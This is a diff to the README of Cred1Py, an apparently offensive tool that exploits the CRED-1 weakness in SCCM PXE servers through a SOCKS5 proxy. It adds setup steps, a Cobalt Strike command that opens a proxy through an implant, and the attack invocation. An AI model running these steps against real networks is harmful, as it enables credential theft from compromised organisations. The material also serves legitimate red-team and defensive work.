@@ -2,18 +2,38 @@
 
 This is a tool used to exploit CRED-1 over a SOCKS5 connection (with UDP support).
 
+## Installation
+
+```
+python3 -m venv env
+source ./env/bin/activate
+pip install -r requirements.txt
+```
+
 ## Usage
 
 To use Cred1Py:
+
+Start a SOCKS5 proxy via your C2, for example, CS uses the command:
+
+```
+> socks 9090 socks5 enableNoAuth a b
+```
+
+Then we can invoke Cred1py with:
 
 ```
 python ./main.py <target> <src_ip> <socks_host> <socks_port>
 ```
 
-Target - The SCCM PXE server IP
-SRC_IP - The IP address of the host we are running the implant on
-SOCKS_HOST - The IP of the team server running SOCKS5
-SOCKS_PORT - The SOCKS5 port
+Where:
+
+* Target - The SCCM PXE server IP
+* SRC_IP - The IP address of the host we are running the implant on
+* SOCKS_HOST - The IP of the team server running SOCKS5
+* SOCKS_PORT - The SOCKS5 port
+
+Note: Due to the way that SOCKS5 works, the C2 server will need to be accessible on all ports to Cred1py as a second ephemeral port is opened as part of the relaying of UDP traffic. Easiest method is usually to just run Cred1py on the C2 server and target `localhost`.. but you do you!
 
 ## How CRED-1 Attack Works
 
